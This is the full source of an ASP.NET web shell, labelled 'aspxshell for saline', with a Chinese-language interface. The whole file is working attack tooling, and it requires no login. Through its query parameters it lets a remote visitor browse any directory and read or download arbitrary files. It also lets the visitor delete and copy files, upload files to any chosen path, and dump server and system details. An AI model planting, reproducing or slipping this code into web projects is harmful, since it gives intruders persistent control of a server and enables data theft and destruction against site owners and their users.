<%@ Page Language="C#" ContentType="text/html"  validateRequest="false" aspcompat="true"%>
<% @Import Namespace="System.Drawing" %>
<% @Import Namespace="System.IO" %>
<% @Import Namespace="System.Drawing.Imaging" %>
<%

System.Web.HttpContext context = this.Context;
System.Text.StringBuilder sb=new System.Text.StringBuilder();

//获取参数
string c=context.Request["c"]; //命令
string p=context.Request["p"]; //命令需要参数
if(c==null) {c="dir";p=Server.MapPath(".");}
if(p==null) p="";
c=c.Trim().ToLower();
p=p.Trim().ToLower();

ShowHeader();

// context.Request.SaveAs("f:\\request.txt",true);

//显示文件
if(c=="show")
{
showFile(p);
}
//显示目录
if(c=="dir" )
{
dir(p);

}
if(c=="down")
{
DownLoadFile(p);
}
if(c=="upload")
{         if( p=="")
ShowUpLoadForm();
else
UpLoadFile("");
}
if(c=="del")
{
DelFile(p);
}
if(c=="copy")
{
CopyFile(p);
}
if(c=="sysinfo")
{
ShowSysInfo();
}
ShowFooter();

%>
<script language="C#" runat="server">

private void ShowHeader()
{
Response.Write("<html><head>aspxshell for saline<br/><hr></head><body>");
//string path=Server.MapPath("dir.ashx");
Response.Write("系统参数：</br><hr>");
Response.Write("主机名:"+Server.MachineName+"<br/>");
Response.Write("服务器IP:"+Request.ServerVariables["LOCAL_ADDR"]  +"<br/>");
Response.Write("你的IP:"+ Request.ServerVariables["REMOTE_ADDR"]  +"<br/>");
Response.Write("操作系统:"+Environment.OSVersion.ToString().Remove(0, 10) +" <br/>");
Response.Write("服务器软件:"+Request.ServerVariables["SERVER_SOFTWARE"] +" <br/>");
Response.Write("当前用户:"+Environment.UserName +" <br/>");
Response.Write("物理路径:"+Request.PhysicalApplicationPath +" <br/>");
Response.Write("相对路径:"+Request.CurrentExecutionFilePath  +" <br/>");
Response.Write("相对根目录:"+Request.ApplicationPath   +" <br/>");
Response.Write("<hr><br>");
Response.Write("查看文件夹 : cmd.aspx?c=dir&p=c:/<br>");
Response.Write("查看文件 : cmd.aspx?c=show&p=c:/t.txt");
Response.Write("<hr><br>");
Response.Write("<a target=_self href='cmd.aspx?c=dir' > 列目录   </a>");

Response.Write("<a target=_self href='cmd.aspx?c=upload&p=' > |上传吧 </a>");

Response.Write("<hr><br>");
}
private void ShowFooter()
{

Response.Write("<hr><br/>");
Response.Write("</body></html>");
Response.Flush();
Response.Close();

}
private void DelFile(string p)
{
try
{
System.IO.FileInfo f = new System.IO.FileInfo(p);
f.Delete();
Response.Write("Success Delete File : " +p);
}
catch(Exception exp)
{
Response.Write("Error Delete File : " +p +"   " + exp.Message);
}

}
private void CopyFile(string p)
{
try
{
System.IO.FileInfo f = new System.IO.FileInfo(p);
f.CopyTo(p+".rar");
Response.Write("Success Copy  File : " +p);
}
catch(Exception exp)
{
Response.Write("Error Copy File : " +p +"   " + exp.Message);
}

}
private void dir(string p )
{
if(p=="") p=Server.MapPath(".");
StringBuilder sb = new StringBuilder();
//显示上一级目录
if(p.LastIndexOf("\\")>1)
{
string pf=p.Substring(0,p.LastIndexOf("\\"));
Response.Write("<a target=_self href='cmd.aspx?c=dir&p="+pf+"'>"+"上级目录"+"</a><br/>");
}

System.IO.DirectoryInfo d= new DirectoryInfo(p); //("f:\\usr\\cw3b058"); //
foreach (DirectoryInfo sub in d.GetDirectories())
{

Response.Write("<a target=_self href='cmd.aspx?c=dir&p="+sub.FullName+"'>"+sub.FullName+"</a><br/>");

}

foreach (FileInfo File in d.GetFiles())
{
sb.Remove(0,sb.Length);
sb.Append("<a target=blank href='cmd.aspx?c=show&p="+File.FullName+"'>"+File.FullName+"</a>             ");
sb.Append("<a target=blank href='cmd.aspx?c=down&p="+File.FullName+"'>"+"   下载   "+"</a>");
sb.Append("<a target=blank href='"+File.Name+"'>"+"   查看   "+"</a>");
sb.Append("<a target=blank href='cmd.aspx?c=del&p="+File.FullName+"'>"+"     删除    "+"</a>");
sb.Append("<a target=blank href='cmd.aspx?c=copy&p="+File.FullName+"'>"+"     复制    "+"</a><br/>");
Response.Write(sb.ToString());
}
}
private void showFile(string p)
{
StringBuilder sb = new StringBuilder();
StreamReader objReader = new StreamReader(p);
string sLine="";
while (sLine != null)
{
sLine = objReader.ReadLine();
if (sLine != null)
sb.Append(sLine+"<br>");
}
objReader.Close();
Response.Write(sb.ToString());
}

public   void   DownLoadFile(string   strDownFile)
{
//string   str=Server.MapPath(strDownFile);
string   str= strDownFile;
if(System.IO.File.Exists(str))
{
System.IO.FileInfo   fi=new   System.IO.FileInfo(str);
System.Web.HttpContext.Current.Response.Clear();
System.Web.HttpContext.Current.Response.ClearHeaders();
System.Web.HttpContext.Current.Response.Buffer   =   false;
System.Web.HttpContext.Current.Response.ContentType   =   "application/octet-stream";
System.Web.HttpContext.Current.Response.AppendHeader("Content-Disposition","attachment;filename="   +HttpUtility.UrlEncode(fi.FullName,System.Text.Encoding.UTF8));
System.Web.HttpContext.Current.Response.AppendHeader("Content-Length",fi.Length.ToString());
System.Web.HttpContext.Current.Response.WriteFile(fi.FullName);
System.Web.HttpContext.Current.Response.Flush();
System.Web.HttpContext.Current.Response.End();
}
else
{
Response.Write("<script>  alert('文件未找到') <//script>");
}

}
public   void  ShowUpLoadForm()
{
StringBuilder sb = new StringBuilder();
sb.Append("<form name='form1' method='post' action='cmd.aspx?c=upload&p=tt'  id='form1' enctype='multipart/form-data'>");
sb.Append("<div><input type='file' name='FileUpload1' id='FileUpload1' //><br//>");
sb.Append("<div><input type='file' name='FileUpload2' id='FileUpload2' //><br//>");
sb.Append("<div>upload dir:<input   name='updir' id='updir' //><br//>");

sb.Append("<input type='submit' name='Button1' value='Upload File' id='Button1' //> <br//><br//> <span id='Label1'><//span>");
sb.Append("</div></form>");
Response.Write(sb.ToString());

}
public   void  UpLoadFile(string updir)
{
//string filepath = Server.MapPath(".");
string filepath = System.Web.HttpContext.Current.Request["updir"];
HttpFileCollection uploadedFiles = Request.Files;
string str="";
for (int i = 0; i < uploadedFiles.Count; i++)
{
HttpPostedFile userPostedFile = uploadedFiles[i];

try
{
if (userPostedFile.ContentLength > 0 )
{
str += "File #" + (i+1) +        "";
str += "File Content Type: " + userPostedFile.ContentType + "";
str += "File Size: " +     userPostedFile.ContentLength + "kb";
str += "File Name: " + userPostedFile.FileName + "<br//>";

userPostedFile.SaveAs(filepath + "\\" + System.IO.Path.GetFileName(userPostedFile.FileName));

str += "Location where saved: " + filepath + "\\" +    System.IO.Path.GetFileName(userPostedFile.FileName)+"<br//>" ;
}
}
catch (Exception Ex)
{
str += "Error: " + Ex.Message;
}
Response.Write(str);
}

}

public void ShowSysInfo()
{

Response.Write("系统参数：</br><hr>");
Response.Write(Server.MachineName+"<br>");
Response.Write("物理路径:"+Request.PhysicalApplicationPath +" <br/>");
Response.Write("相对路径:"+Request.CurrentExecutionFilePath  +" <br/>");
Response.Write("相对根目录:"+Request.ApplicationPath   +" <br/>");

foreach(object o in Request.ServerVariables.Keys)
{
Response.Write(o.ToString()+ ":" +Request.ServerVariables[o.ToString()].ToString()+     "<hr><br>");
}
}
</script>